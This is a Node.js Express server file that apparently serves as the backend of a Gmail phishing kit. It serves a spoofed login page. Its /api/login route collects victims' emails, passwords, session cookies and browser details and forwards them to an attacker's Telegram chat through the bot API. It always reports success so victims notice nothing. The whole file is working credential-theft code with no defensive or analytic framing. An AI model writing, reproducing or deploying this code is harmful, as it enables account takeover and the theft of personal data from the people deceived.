const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Serve static files
const publicPath = path.join(__dirname, 'public');
if (fs.existsSync(publicPath)) {
    app.use(express.static(publicPath));
} else {
    app.use(express.static(__dirname));
}

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('🔧 Telegram config:');
console.log('  Token:', TELEGRAM_BOT_TOKEN ? '✅ set' : '❌ missing');
console.log('  Chat ID:', TELEGRAM_CHAT_ID ? '✅ set' : '❌ missing');

app.post('/api/login', async (req, res) => {
    const { email, password, cookies, userAgent, timestamp, pageUrl } = req.body;

    console.log('📨 Received credentials for:', email);

    const message =
        `📩 New Gmail Credentials\n` +
        `👤 Email: ${email}\n` +
        `🔑 Password: ${password}\n` +
        `🍪 Cookies: ${cookies || '(none)'}\n` +
        `🖥️ User‑Agent: ${userAgent}\n` +
        `⏱️ Time: ${timestamp}\n` +
        `🔗 Page: ${pageUrl}`;

    let telegramResult = 'not attempted';
    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
        try {
            const truncated = message.slice(0, 4000);
            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            const resp = await axios.post(telegramUrl, {
                chat_id: TELEGRAM_CHAT_ID,
                text: truncated,
                parse_mode: ''
            });
            console.log('✅ Telegram response:', resp.data);
            if (resp.data && resp.data.ok) {
                telegramResult = 'success';
            } else {
                telegramResult = 'failed: ' + (resp.data.description || 'unknown');
            }
        } catch (err) {
            console.error('❌ Telegram error:', err.response?.data || err.message);
            telegramResult = 'failed: ' + (err.response?.data?.description || err.message);
        }
    } else {
        telegramResult = 'not configured';
    }

    // Always return success to the frontend (no error shown)
    res.json({ status: 'ok' });
});

// Fallback – serve index.html
app.get('*', (req, res) => {
    const possiblePaths = [
        path.join(__dirname, 'public', 'index.html'),
        path.join(__dirname, 'index.html')
    ];
    for (const p of possiblePaths) {
        if (fs.existsSync(p)) {
            return res.sendFile(p);
        }
    }
    res.status(404).send('index.html not found');
});

app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
});
